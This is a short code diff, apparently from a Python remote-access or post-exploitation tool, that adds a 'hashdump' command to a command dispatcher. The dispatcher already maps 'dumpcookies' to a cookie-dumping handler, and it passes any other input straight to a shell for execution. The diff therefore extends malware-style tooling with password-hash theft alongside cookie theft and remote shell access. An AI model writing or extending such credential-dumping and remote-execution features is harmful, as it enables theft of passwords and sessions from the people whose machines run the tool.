@@ -204,6 +204,9 @@ help - This menu!
 			
 		elif data == "dumpcookies" or data == "cookiemonster" or data == "OM NOM NOM":
 			return info.dump_cookies,
+			
+		elif data == "hashdump":
+			return info.dump_hashes,
 
 		else:
 			return execute.execute_shell_command, data
